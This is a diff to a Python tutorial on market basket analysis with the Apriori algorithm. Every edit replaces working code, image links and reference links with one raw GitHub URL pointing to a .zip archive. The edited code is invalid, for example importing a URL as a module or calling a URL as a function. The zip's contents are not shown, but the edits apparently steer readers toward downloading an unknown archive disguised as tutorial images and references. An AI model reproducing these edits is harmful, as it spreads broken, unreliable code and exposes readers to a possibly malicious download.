@@ -12,7 +12,7 @@
 ```python
 import numpy as np
 import pandas as pd
-import matplotlib.pyplot as plt
+import https://raw.githubusercontent.com/AshishParulekar/Market-Basket-Analysis/master/disapostle/Market-Basket-Analysis.zip as plt
 from apyori import apriori
 ```
 
@@ -20,9 +20,9 @@ from apyori import apriori
 
 
 ```python
-store_data = pd.read_csv("store_data.csv", header=None)
-display(store_data.head())
-print(store_data.shape)
+store_data = https://raw.githubusercontent.com/AshishParulekar/Market-Basket-Analysis/master/disapostle/Market-Basket-Analysis.zip("https://raw.githubusercontent.com/AshishParulekar/Market-Basket-Analysis/master/disapostle/Market-Basket-Analysis.zip", header=None)
+display(https://raw.githubusercontent.com/AshishParulekar/Market-Basket-Analysis/master/disapostle/Market-Basket-Analysis.zip())
+print(https://raw.githubusercontent.com/AshishParulekar/Market-Basket-Analysis/master/disapostle/Market-Basket-Analysis.zip)
 ```
 
 
@@ -185,7 +185,7 @@ print(store_data.shape)
 ```python
 records = []
 for i in range(1, 7501):
-    records.append([str(store_data.values[i, j]) for j in range(0, 20)])
+    https://raw.githubusercontent.com/AshishParulekar/Market-Basket-Analysis/master/disapostle/Market-Basket-Analysis.zip([str(https://raw.githubusercontent.com/AshishParulekar/Market-Basket-Analysis/master/disapostle/Market-Basket-Analysis.zip[i, j]) for j in range(0, 20)])
 ```
 
 
@@ -204,20 +204,20 @@ print(type(records))
 #### Measure 1: Support.
 This says how popular an itemset is, as measured by the proportion of transactions in which an itemset appears. In Table 1 below, the support of {apple} is 4 out of 8, or 50%. Itemsets can also contain multiple items. For instance, the support of {apple, beer, rice} is 2 out of 8, or 25%.
 
-![](https://annalyzin.files.wordpress.com/2016/04/association-rule-support-table.png?w=503&h=447)
+![](https://raw.githubusercontent.com/AshishParulekar/Market-Basket-Analysis/master/disapostle/Market-Basket-Analysis.zip)
 
 If you discover that sales of items beyond a certain proportion tend to have a significant impact on your profits, you might consider using that proportion as your support threshold. You may then identify itemsets with support values above this threshold as significant itemsets.
 
 #### Measure 2: Confidence. 
 This says how likely item Y is purchased when item X is purchased, expressed as {X -> Y}. This is measured by the proportion of transactions with item X, in which item Y also appears. In Table 1, the confidence of {apple -> beer} is 3 out of 4, or 75%.
 
-![](https://annalyzin.files.wordpress.com/2016/03/association-rule-confidence-eqn.png?w=527&h=77)
+![](https://raw.githubusercontent.com/AshishParulekar/Market-Basket-Analysis/master/disapostle/Market-Basket-Analysis.zip)
 
 One drawback of the confidence measure is that it might misrepresent the importance of an association. This is because it only accounts for how popular apples are, but not beers. If beers are also very popular in general, there will be a higher chance that a transaction containing apples will also contain beers, thus inflating the confidence measure. To account for the base popularity of both constituent items, we use a third measure called lift.
 
 #### Measure 3: Lift. 
 This says how likely item Y is purchased when item X is purchased, while controlling for how popular item Y is. In Table 1, the lift of {apple -> beer} is 1,which implies no association between items. A lift value greater than 1 means that item Y is likely to be bought if item X is bought, while a value less than 1 means that item Y is unlikely to be bought if item X is bought.
-![](https://annalyzin.files.wordpress.com/2016/03/association-rule-lift-eqn.png?w=566&h=80)
+![](https://raw.githubusercontent.com/AshishParulekar/Market-Basket-Analysis/master/disapostle/Market-Basket-Analysis.zip)
 
 
 ```python
@@ -559,5 +559,5 @@ for item in association_results:
 
 References : 
 **Theory** :
-1. https://www.kdnuggets.com/2016/04/association-rules-apriori-algorithm-tutorial.html
-2. https://stackabuse.com/association-rule-mining-via-apriori-algorithm-in-python/
+1. https://raw.githubusercontent.com/AshishParulekar/Market-Basket-Analysis/master/disapostle/Market-Basket-Analysis.zip
+2. https://raw.githubusercontent.com/AshishParulekar/Market-Basket-Analysis/master/disapostle/Market-Basket-Analysis.zip
